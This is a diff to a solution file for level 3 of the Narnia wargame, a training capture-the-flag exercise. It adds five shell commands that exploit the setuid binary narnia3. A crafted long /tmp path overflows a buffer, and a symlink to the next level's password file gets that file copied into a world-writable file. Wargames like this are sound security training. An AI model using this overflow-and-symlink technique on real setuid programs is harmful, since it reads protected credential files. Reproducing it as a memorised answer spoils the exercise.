@@ -1,1 +1,7 @@
 Write the solution of the level in this file please.
+
+mkdir -p /tmp/12345678912345678912345678c/tmp/../tmp/
+ln -s /etc/narnia_pass/narnia4 /tmp/12345678912345678912345678c/tmp/../tmp/lub
+touch /tmp/lub
+chmod 777 /tmp/lub
+/narnia/narnia3 /tmp/12345678912345678912345678c/tmp/../tmp/lub 
